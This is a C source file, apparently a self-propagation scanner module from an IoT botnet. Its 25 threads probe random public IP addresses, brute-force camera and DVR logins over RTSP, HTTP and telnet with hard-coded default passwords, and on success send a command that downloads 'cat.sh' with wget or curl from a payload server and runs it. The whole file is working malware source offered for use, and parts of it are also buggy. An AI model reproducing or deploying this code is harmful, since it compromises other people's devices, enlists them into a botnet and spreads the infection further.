#define _GNU_SOURCE
//THIS SCANNER IS NOT GUARANTEED/TESTED
#include "headers/scanner.h"
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <errno.h>
#include <sys/time.h>

#define RTSP_PORT 554
#define TIMEOUT 3
#define MAX_RETRIES 2
#define SCAN_DELAY 3000
#define CREDS_COUNT 13

static volatile int scanner_active = 0;

struct rtsp_auth {
    char *username;
    char *password;
};

static struct rtsp_auth default_creds[] = {
//this dvr have telnet
    {"admin", "xc3511"},
    {"admin", "admin"},
    {"admin", "123456"},
    {"admin", ""},
    {"admin", "12345"},
    {"default", "default"},
    {"default", "tluafed"},
    {"root", "pass"},
    {"root", "xc3511"},
    {"root", "vizxv"},
    {"root", "admin"},
    {"root", ""},
    {"root", "juantech"},
    {NULL, NULL}
};

static const unsigned int private_ranges[] = {
    //honeypots?
    0x0A000000,  // 10.0.0.0/8
    0x7F000000,  // 127.0.0.0/8
    0xA9FE0000,  // 169.254.0.0/16
    0xAC100000,  // 172.16.0.0/12
    0xC0A80000,  // 192.168.0.0/16
    0x64400000,  // 100.64.0.0/10
    0
};

static int is_private_ip(unsigned int ip) {
    for(int i = 0; private_ranges[i]; i++) {
        if((ip & 0xFF000000) == private_ranges[i]) return 1;
    }
    return 0;
}

static int try_auth(int sock, const char *ip, struct rtsp_auth *auth) {
    char buffer[2048];
    char request[512];
    int ret;

    snprintf(request, sizeof(request),
        "POST /login.htm HTTP/1.1\r\n"
        "Host: %s:554\r\n"
        "Content-Length: %d\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Connection: keep-alive\r\n"
        "\r\n"
        "command=login&username=%s&password=%s",
        ip, (int)(21 + strlen(auth->username) + strlen(auth->password)),
        auth->username, auth->password);

    send(sock, request, strlen(request), 0);
    usleep(100000);
    
    memset(buffer, 0, sizeof(buffer));
    ret = recv(sock, buffer, sizeof(buffer), MSG_DONTWAIT);

    if(ret > 0) {
        if(strstr(buffer, "200 OK") || strstr(buffer, "Set-Cookie")) {
            char cmd[512];
            snprintf(cmd, sizeof(cmd), 
                "cd /tmp || cd /var/run || cd /mnt || cd /root "
                "wget http://%s/cat.sh; curl -O http://%s/cat.sh; chmod 777 cat.sh; sh cat.sh; ",
                BINSERVER, BINSERVER);
            
            send(sock, cmd, strlen(cmd), 0);
            usleep(100000);
            return 1;
        }
    }
    return 0;
}

static int try_telnet_specific(char *ip) {
    struct sockaddr_in addr;
    int sock;
    char buffer[2048];
    
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if(sock < 0) return 0;

    addr.sin_family = AF_INET;
    addr.sin_port = htons(23);
    addr.sin_addr.s_addr = inet_addr(ip);

    struct timeval tv;
    tv.tv_sec = TIMEOUT;
    tv.tv_usec = 0;
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));

    if(connect(sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        close(sock);
        return 0;
    }

    memset(buffer, 0, sizeof(buffer));
    recv(sock, buffer, sizeof(buffer), MSG_DONTWAIT);
    send(sock, "root\n", 5, 0);
    usleep(100000);
    
    memset(buffer, 0, sizeof(buffer));
    recv(sock, buffer, sizeof(buffer), MSG_DONTWAIT);
    send(sock, "xc3511\n", 7, 0);
    usleep(100000);

    memset(buffer, 0, sizeof(buffer));
    if(recv(sock, buffer, sizeof(buffer), MSG_DONTWAIT) > 0) {
        char cmd[512];
        snprintf(cmd, sizeof(cmd), 
            "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; "
            "wget http://%s/cat.sh; curl -O http://%s/cat.sh; chmod 777 cat.sh; sh cat.sh; "
            BINSERVER, BINSERVER);
        
        send(sock, cmd, strlen(cmd), 0);
    }
    close(sock);
    return 0;
}

static int try_xiongmai_web(char *ip) {
    struct sockaddr_in addr;
    int sock;
    int ret = 0;

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if(sock < 0) return 0;

    addr.sin_family = AF_INET;
    addr.sin_port = htons(81);
    addr.sin_addr.s_addr = inet_addr(ip);

    struct timeval tv;
    tv.tv_sec = TIMEOUT;
    tv.tv_usec = 0;
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));

    if(connect(sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        close(sock);
        return 0;
    }

    for(int i = 0; default_creds[i].username != NULL; i++) {
        if(try_auth(sock, ip, &default_creds[i])) {
            ret = 1;
            break;
        }
    }
    close(sock);
    return ret;
}

static int try_rtsp(char *ip) {
    struct sockaddr_in addr;
    int sock;
    int ret = 0;

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if(sock < 0) return 0;

    addr.sin_family = AF_INET;
    addr.sin_port = htons(RTSP_PORT);
    addr.sin_addr.s_addr = inet_addr(ip);

    struct timeval tv;
    tv.tv_sec = TIMEOUT;
    tv.tv_usec = 0;
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));

    if(connect(sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        close(sock);
        return 0;
    }

    if(try_xiongmai_web(ip)) {
        ret = 1;
    }
    try_telnet_specific(ip);

    for(int i = 0; default_creds[i].username != NULL; i++) {
        if(try_auth(sock, ip, &default_creds[i])) {
            ret = 1;
            break;
        }
    }

    close(sock);
    return ret;
}

static void* rtsp_scanner_thread(void* arg) {
    int thread_id = *(int*)arg;
    free(arg);
    
    char ip[20];  
    int scanned = 0;
    time_t last_time = time(NULL);
    
    srand(time(NULL) ^ (thread_id << 16));

    scanner_active = 1;
    while(scanner_active) {
        time_t current = time(NULL);
        if(current != last_time) {
            scanned = 0;
            last_time = current;
        }

        if(scanned >= 10) {
            sleep(1);
            continue;
        }

        unsigned int ip1 = rand() % 255;
        
        if(is_private_ip(ip1 << 24)) {
            continue;
        }

        snprintf(ip, sizeof(ip), "%u.%d.%d.%d", ip1, rand() % 255, rand() % 255, rand() % 255);
        if(try_rtsp(ip)) {
        }
        scanned++;
    }

    return NULL;
}

void start_rtsp_scanner(void) {
    pthread_mutex_lock(&scanner_mutex);
    scanner_active = 1;
    
    for (int i = 0; i < 25; i++) {
        int *thread_id = malloc(sizeof(int));
        if (!thread_id) continue;
        
        *thread_id = i;
        pthread_t thread;
        pthread_create(&thread, NULL, rtsp_scanner_thread, thread_id);
        pthread_detach(thread);
    }
    pthread_mutex_unlock(&scanner_mutex);
}

void stop_rtsp_scanner(void) {
    pthread_mutex_lock(&scanner_mutex);
    scanner_active = 0;
    pthread_mutex_unlock(&scanner_mutex);
}
